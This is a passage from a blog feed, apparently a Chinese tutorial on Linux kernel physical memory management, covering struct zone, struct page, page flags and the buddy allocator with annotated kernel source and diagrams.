Write-intensive fields used from the page allocator */</span></span><br><span class="line">ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* free areas of different sizes */</span></span><br><span class="line">    <span class="comment">// buddy分配器使用的空闲区域位图</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span><span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone flags, see below */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Primarily protects free_area */</span></span><br><span class="line">    <span class="comment">// spinlock防止对区域的并发访问</span></span><br><span class="line"><span class="keyword">spinlock_t</span>lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write-intensive fields used by compaction and vmstats. */</span></span><br><span class="line">ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When free pages are below this point, additional steps are taken</span></span><br><span class="line"><span class="comment"> * when reading the number of free pages to avoid per-cpu counter</span></span><br><span class="line"><span class="comment"> * drift allowing watermarks to be breached</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line"><span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_cached_free_pfn;</span><br><span class="line"><span class="comment">/* pfn where compaction migration scanner should start */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_cached_migrate_pfn[ASYNC_AND_SYNC];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_init_migrate_pfn;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_init_free_pfn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment"> * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment"> * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment"> * compact_order_failed is the minimum compaction failed order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>compact_considered;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>compact_defer_shift;</span><br><span class="line"><span class="keyword">int</span>compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line"><span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line"><span class="keyword">bool</span>compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span>contiguous;</span><br><span class="line"></span><br><span class="line">ZONE_PADDING(_pad3_)</span><br><span class="line"><span class="comment">/* Zone statistics */</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_numa_stat[NR_VM_NUMA_STAT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">pgdat_flags</span> &#123;</span></span><br><span class="line">PGDAT_DIRTY,<span class="comment">/* reclaim scanning has recently found</span></span><br><span class="line"><span class="comment"> * many dirty file pages at the tail</span></span><br><span class="line"><span class="comment"> * of the LRU.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PGDAT_WRITEBACK,<span class="comment">/* reclaim scanning has recently found</span></span><br><span class="line"><span class="comment"> * many pages under writeback</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PGDAT_RECLAIM_LOCKED,<span class="comment">/* prevents concurrent reclaim */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="页面（Page）"><a href="#页面（Page）" class="headerlink" title="页面（Page）"></a>页面（Page）</h3><p>系统内存由固定的块组成，称为页帧（页框），每个页帧由<code>struct page</code>结构描述。内核在初始化时，会根据内存的大小计算出有多少页帧，每个页帧都会有一个page结构与之对应，这些信息保存在全局数组变量mem_map中。mem_map通常存储在<code>ZONE_NORMAL</code>区域中，在内存较小的机器中，会保存在加载内核镜像后的一片保留空间里。有多少个物理页面，就会有多个<code>struct page</code>结构。</p><h4 id="struct-page结构体"><a href="#struct-page结构体" class="headerlink" title="struct page结构体"></a>struct page结构体</h4><p><code>struct page</code>数据结构定义在文件<code>include/linux/mm_types.h</code>中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">// 描述页面状态的标志。所有的标志在include/linux/page-flags.h中定义，</span></span><br><span class="line">    <span class="comment">// 主要标志包括PG_locked、PG_error、PG_referenced、PG_uptodate、</span></span><br><span class="line">    <span class="comment">// PG_active、PG_dirty、PG_lru等。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;<span class="comment">/* Atomic flags, some possibly</span></span><br><span class="line"><span class="comment"> * updated asynchronously */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Five words (20/40 bytes) are available in this union.</span></span><br><span class="line"><span class="comment"> * WARNING: bit 0 of the first word is used for PageTail(). That</span></span><br><span class="line"><span class="comment"> * means the other users of this union MUST NOT use the bit to</span></span><br><span class="line"><span class="comment"> * avoid collision and false-positive PageTail().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Page cache and anonymous pages */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @lru: Pageout list, eg. active_list protected by</span></span><br><span class="line"><span class="comment"> * lruvec-&gt;lru_lock.  Sometimes used as a generic list</span></span><br><span class="line"><span class="comment"> * by the page owner.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">            </span><br><span class="line">             <span class="comment">// 为页面替换策略，可以被换出的页面可能存在与active_list或者inactive_list。这是LRU的链表头</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line">            </span><br><span class="line"><span class="comment">/* See page-flags.h for PAGE_MAPPING_FLAGS */</span></span><br><span class="line">             <span class="comment">// 系统或者设备映射到内存中时，它们的inode结构就会和address_space</span></span><br><span class="line">             <span class="comment">// 相关联。当页面属于一个文件时，mmaping就会指向这个地址空间。</span></span><br><span class="line">             <span class="comment">// 如果这个页面是匿名的且映射开启，则address_space就是swapper_space</span></span><br><span class="line">             <span class="comment">// swapper_space是管理交换地址空间的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">            </span><br><span class="line"><span class="keyword">pgoff_t</span> index;<span class="comment">/* Our offset within mapping. */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @private: Mapping-private opaque data.</span></span><br><span class="line"><span class="comment"> * Usually used for buffer_heads if PagePrivate.</span></span><br><span class="line"><span class="comment"> * Used for swp_entry_t if PageSwapCache.</span></span><br><span class="line"><span class="comment"> * Indicates order in the buddy system if PageBuddy.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* page_pool used by netstack */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dma_addr: might require a 64-bit value even on</span></span><br><span class="line"><span class="comment"> * 32-bit architectures.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">dma_addr_t</span> dma_addr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* slab, slob and slub */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Partial pages */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line"><span class="keyword">int</span> pages;<span class="comment">/* Nr of pages left */</span></span><br><span class="line"><span class="keyword">int</span> pobjects;<span class="comment">/* Approximate count */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> pages;</span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span> <span class="comment">/* not slob */</span></span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="keyword">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> *s_mem;<span class="comment">/* slab: first object */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> counters;<span class="comment">/* SLUB */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* SLUB */</span></span><br><span class="line"><span class="keyword">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="keyword">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="keyword">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Tail pages of compound page */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> compound_head;<span class="comment">/* Bit zero is set */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* First tail page only */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> compound_dtor;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> compound_order;</span><br><span class="line"><span class="keyword">atomic_t</span> compound_mapcount;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> compound_nr; <span class="comment">/* 1 &lt;&lt; compound_order */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Second tail page of compound page */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _compound_pad_1;<span class="comment">/* compound_head */</span></span><br><span class="line"><span class="keyword">atomic_t</span> hpage_pinned_refcount;</span><br><span class="line"><span class="comment">/* For both global and memcg */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">deferred_list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Page table pages */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _pt_pad_1;<span class="comment">/* compound_head */</span></span><br><span class="line"><span class="keyword">pgtable_t</span> pmd_huge_pte; <span class="comment">/* protected by page-&gt;ptl */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _pt_pad_2;<span class="comment">/* mapping */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">pt_mm</span>;</span> <span class="comment">/* x86 pgds only */</span></span><br><span class="line"><span class="keyword">atomic_t</span> pt_frag_refcount; <span class="comment">/* powerpc */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ALLOC_SPLIT_PTLOCKS</span></span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* ZONE_DEVICE pages */</span></span><br><span class="line"><span class="comment">/** @pgmap: Points to the hosting device page map. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span></span><br><span class="line"><span class="keyword">void</span> *zone_device_data;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_DEVICE private pages are counted as being</span></span><br><span class="line"><span class="comment"> * mapped so the next 3 words hold the mapping, index,</span></span><br><span class="line"><span class="comment"> * and private fields from the source anonymous or</span></span><br><span class="line"><span class="comment"> * page cache page while the page is migrated to device</span></span><br><span class="line"><span class="comment"> * private memory.</span></span><br><span class="line"><span class="comment"> * ZONE_DEVICE MEMORY_DEVICE_FS_DAX pages also</span></span><br><span class="line"><span class="comment"> * use the mapping, index, and private fields when</span></span><br><span class="line"><span class="comment"> * pmem backed DAX files are mapped.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** @rcu_head: You can use this to free a page by RCU. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span><span class="comment">/* This union is 4 bytes in size. */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the page can be mapped to userspace, encodes the number</span></span><br><span class="line"><span class="comment"> * of times this page is referenced by a page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        </span><br><span class="line">         <span class="comment">// 页面表总共有多少项指向该页面</span></span><br><span class="line"><span class="keyword">atomic_t</span> _mapcount;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the page is neither PageSlab nor mappable to userspace,</span></span><br><span class="line"><span class="comment"> * the value stored here may help determine what this page</span></span><br><span class="line"><span class="comment"> * is used for.  See page-flags.h for a list of page types</span></span><br><span class="line"><span class="comment"> * which are currently stored here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> active;<span class="comment">/* SLAB */</span></span><br><span class="line"><span class="keyword">int</span> units;<span class="comment">/* SLOB */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */</span></span><br><span class="line"><span class="keyword">atomic_t</span> _refcount;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On machines where all RAM is mapped into kernel address space,</span></span><br><span class="line"><span class="comment"> * we can simply calculate the virtual address. On machines with</span></span><br><span class="line"><span class="comment"> * highmem some memory is mapped into kernel virtual memory</span></span><br><span class="line"><span class="comment"> * dynamically, so we need a place to store that address.</span></span><br><span class="line"><span class="comment"> * Note that this field could be 16 bits on x86 ... ;)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Architectures with slow multiplication can define</span></span><br><span class="line"><span class="comment"> * WANT_PAGE_VIRTUAL in asm/page.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 正常情况下只有处于ZONE_NORMAL的页面内核直接映射。对于ZONE_HIGHMEM区域的页面</span></span><br><span class="line">    <span class="comment">// 内核使用kmap()来映射页面。当页面被映射后，virtual是它的虚拟地址</span></span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">virtual</span>;<span class="comment">/* Kernel virtual address (NULL if</span></span><br><span class="line"><span class="comment">   not kmapped, ie. highmem) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line"><span class="keyword">int</span> _last_cpupid;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; _struct_page_alignment;</span><br></pre></td></tr></table></figure><p>此处用一张图来帮我们理一下我们的思路，以3G（用户空间）/ 1G（内核空间）</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419102870/0" alt="image-20210416194931072"></p><p>可以看到物理地址0~896M，这里就是NORMAL的区域，这里是直接被映射到内核空间开始的896M处，往上就是HIGNMEM区域。这里有一个很重要的点就是，ZONE_DMA、ZONE_NORMAL、ZONE_HIGNMEM这些区域是对于物理地址而言，而且表示的是区间，不是对应大小的物理内存块，所以我们可以推断出不是所有的节点都有这三种区域的。</p><h4 id="页面标志"><a href="#页面标志" class="headerlink" title="页面标志"></a>页面标志</h4><p>页面标志尤其重要，内存分配与回收、IO操作等重要内核活动过程中都会使用到页面标志。所有的标志都在<code>include/linux/page-flags.h</code>中定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">pageflags</span> &#123;</span></span><br><span class="line">PG_locked,<span class="comment">/* Page is locked. Don&#x27;t touch. */</span></span><br><span class="line">PG_referenced,</span><br><span class="line">PG_uptodate,</span><br><span class="line">PG_dirty,</span><br><span class="line">PG_lru,</span><br><span class="line">PG_active,</span><br><span class="line">PG_workingset,</span><br><span class="line">PG_waiters,<span class="comment">/* Page has waiters, check its waitqueue. Must be bit #7 and in the same byte as &quot;PG_locked&quot; */</span></span><br><span class="line">PG_error,</span><br><span class="line">PG_slab,</span><br><span class="line">PG_owner_priv_1,<span class="comment">/* Owner use. If pagecache, fs may use*/</span></span><br><span class="line">PG_arch_1,</span><br><span class="line">PG_reserved,</span><br><span class="line">PG_private,<span class="comment">/* If pagecache, has fs-private data */</span></span><br><span class="line">PG_private_2,<span class="comment">/* If pagecache, has fs aux data */</span></span><br><span class="line">PG_writeback,<span class="comment">/* Page is under writeback */</span></span><br><span class="line">PG_head,<span class="comment">/* A head page */</span></span><br><span class="line">PG_mappedtodisk,<span class="comment">/* Has blocks allocated on-disk */</span></span><br><span class="line">PG_reclaim,<span class="comment">/* To be reclaimed asap */</span></span><br><span class="line">PG_swapbacked,<span class="comment">/* Page is backed by RAM/swap */</span></span><br><span class="line">PG_unevictable,<span class="comment">/* Page is &quot;unevictable&quot;  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">PG_mlocked,<span class="comment">/* Page is vma mlocked */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ARCH_USES_PG_UNCACHED</span></span><br><span class="line">PG_uncached,<span class="comment">/* Page has been mapped as uncached */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span></span><br><span class="line">PG_hwpoison,<span class="comment">/* hardware poisoned page. Don&#x27;t touch */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_IDLE_PAGE_TRACKING) &amp;&amp; defined(CONFIG_64BIT)</span></span><br><span class="line">PG_young,</span><br><span class="line">PG_idle,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">PG_arch_2,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">__NR_PAGEFLAGS,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Filesystems */</span></span><br><span class="line">PG_checked = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* SwapBacked */</span></span><br><span class="line">PG_swapcache = PG_owner_priv_1,<span class="comment">/* Swap page: swp_entry_t in private */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Two page bits are conscripted by FS-Cache to maintain local caching</span></span><br><span class="line"><span class="comment"> * state.  These bits are set on pages belonging to the netfs&#x27;s inodes</span></span><br><span class="line"><span class="comment"> * when those inodes are being locally cached.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PG_fscache = PG_private_2,<span class="comment">/* page backed by cache */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* XEN */</span></span><br><span class="line"><span class="comment">/* Pinned in Xen as a read-only pagetable page. */</span></span><br><span class="line">PG_pinned = PG_owner_priv_1,</span><br><span class="line"><span class="comment">/* Pinned as part of domain save (see xen_mm_pin_all()). */</span></span><br><span class="line">PG_savepinned = PG_dirty,</span><br><span class="line"><span class="comment">/* Has a grant mapping of another (foreign) domain&#x27;s page. */</span></span><br><span class="line">PG_foreign = PG_owner_priv_1,</span><br><span class="line"><span class="comment">/* Remapped by swiotlb-xen. */</span></span><br><span class="line">PG_xen_remapped = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* SLOB */</span></span><br><span class="line">PG_slob_free = PG_private,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Compound pages. Stored in first tail page&#x27;s flags */</span></span><br><span class="line">PG_double_map = PG_workingset,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* non-lru isolated movable page */</span></span><br><span class="line">PG_isolated = PG_reclaim,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only valid for buddy pages. Used to track pages that are reported */</span></span><br><span class="line">PG_reported = PG_uptodate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里解释几个重要的页面标志：</p><p><strong>PG_locked</strong>：页面是否被锁住，若该位设置了该位，则不允许内核其他部分访问该页面。这用来防止内存管理过程中遇到的竞争条件，如当从硬盘读取数据到一个页面时，就不允许其他内核部分访问该页面，因为读数据的过程中，其他内核部分能访问的话，则读取到的数据是不完整的。</p><p><strong>PG_error</strong>：I/O出错，且操作和页面有关，就设置该标志。</p><p><strong>PG_referenced和PG_active</strong>：控制系统使用页面的活跃程度。这个信息对swap系统选择待交换出的页面非常重要。</p><p><strong>PG_update</strong>：表示成功完成从块设备上读取一个页面的数据。该标志和块设备I/O操作有关。</p><p><strong>PG_dirty</strong>：当内存页面中的数据和块设备上的数据不一致时，就设置该标志。在写数据到块设备时，为了提高将来的读性能，数据并不是立即回写到块设备上，而只是设置页面脏标志，表示该页面数据需要回写。</p><p><strong>PG_lru</strong>：该标志用来实现页面回收和交换。</p><p><strong>PG_highmem</strong>：表示该页面为属于高端内存。</p><h2 id="空闲页面的管理"><a href="#空闲页面的管理" class="headerlink" title="空闲页面的管理"></a>空闲页面的管理</h2><p>首先这里是页面的管理，比如我们要分配连续的物理页面，所以这里讲的是伙伴系统，当我们涉及到页面内的，以kb为单位，不再以页为单位去分配内存的时候，此时涉及到的就是slab分配算法。</p><h3 id="物理内存空间描述"><a href="#物理内存空间描述" class="headerlink" title="物理内存空间描述"></a>物理内存空间描述</h3><p>前面我们讲过内核将物理分为3个层次：节点（Node）、区域（Zone）、页面（Page），主要是简单的涉及到它的数据结构。三个关系如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419284497/0" alt="image-20210416203439973"></p><p>在Linux中，空闲内存管理的基本单位是页面(x86/x86-64 CPU定义的页面)，即以页面为单位来管理物理内存(kmalloc等slab/slub机制，是比页面更小的细分)。</p><p>Linux内核管理的每个内存空闲块都是2的幂次方个页面，幂次方的大小为order。把1个空闲页面放在一起、2个空闲页面（物理地址连续）放在一起、4个空闲页面（物理地址连续）放在一起…空闲页面组织，如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419322858/0" alt="image-20210416204434890"></p><p>在我们的内核版本中(Linux5.12-cr7)，MAX_ORDER通常定义为11，内核管理最大的连续空闲物理内存大小为2^(11-1)，即4MB。</p><p><strong>区域（zone）与空闲页面</strong></p><p>在区域（zone）的数据结构中，有个数组<strong>free_area[MAX_ORDER]</strong>来保存每个空闲内存块链表</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419353990/0" alt="image-20210416205324167"></p><p>这样<code>free_area[MAX_ORDER]</code>数组中第1个元素，指向内存块大小为2^0即1个页面的空闲页面链表，以此类推</p><p>每个区域（zone）都有一个<code>free_area[MAX_ORDER]</code>数组，其数据类型<code>free_area</code>结构体定义如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">    <span class="comment">// 空闲页面块的双链表</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line">    <span class="comment">// 该区域中的空闲页面块数量</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>每个空闲页面链表上的各个元素（大小相同的连续物理页面），通过<code>struct page</code>中的双链表成员变量来连接，如下图所示</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419460908/0" alt="image-20210416212219830"></p><p>空闲页面的管理只是在区域（zone）这一层，节点（node）下的每个区域都管理着自己的空闲物理页面。空闲页面管理与节点、区域之间的关系如下图</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419509509/0" alt="image-20210416213524986"></p><h2 id="伙伴算法"><a href="#伙伴算法" class="headerlink" title="伙伴算法"></a>伙伴算法</h2><p>伙伴算法的用途主要是尽可能的减少外部碎片，同时允许快速分配与回收物理页面。为了减少外部碎片，连续的空闲页面，根据空闲块（由连续的空闲页面组成）大小，组织成不同的链表（或orders）。前面涉及到的空闲页面管理就是伙伴系统的一部分。这样所有的2个页面大小的空闲块在一个链表中，4个页面大小的空闲块在一个链表中，以此类推。下面为空闲页面的分配示意图</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13419525548/0" alt="image-20210416213943809"></p><h3 id="伙伴系统举例"><a href="#伙伴系统举例" class="headerlink" title="伙伴系统举例"></a>伙伴系统举例</h3><h4 id="页面分配过程"><a href="#页面分配过程" class="headerlink" title="页面分配过程"></a>页面分配过程</h4><p>现上层请求分配<strong>4个连续地址</strong>的空闲物理页面块</p><ol><li>4=2^(3-1)，因此从Order = 3的空闲块链表上开始找空闲的块</li><li>此时假设在order = 3的链表上没有空闲块；需要到上级order查找是否有空闲块</li><li>从order = 4的链表上开始查找，有一个空闲结点；但该链表上的每个块大小为8个页面，分配4个页面给上层，标记该页面表为已使用</li><li>还剩4个页面。此时将该剩下的4个页面，放入order = 3的链表上</li><li>更新相关统计信息</li></ol><h4 id="页面回收过程"><a href="#页面回收过程" class="headerlink" title="页面回收过程"></a>页面回收过程</h4><ol><li>标记该页面块为空闲</li><li>检查相邻物理页面是否为空闲；若相邻物理页面为空闲，则尝试合并成更大的连续物理页面块（这样可以避免内存碎片化）</li><li>若有合并，则要更新<code>freearea</code>数组中链表元素</li><li>更新相关统计信息</li></ol><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>源码分析基于以下：</p><ol><li>Linux5.12-cr7</li><li>64bit代码处理逻辑</li><li>NUMA架构</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux内核对物理内存描述&quot;&gt;&lt;a href=&quot;#Linux内核对物理内存描述&quot; class=&quot;headerlink&quot; title=&quot;Linux内核对物理内存描述&quot;&gt;&lt;/a&gt;Linux内核对物理内存描述&lt;/h2&gt;&lt;p&gt;Linux将物理内存按固定大小的页面（一般为
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="Kernel" scheme="https://billyotry.github.io/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【Writeup】GitHub Security Lab CTF-1</title>
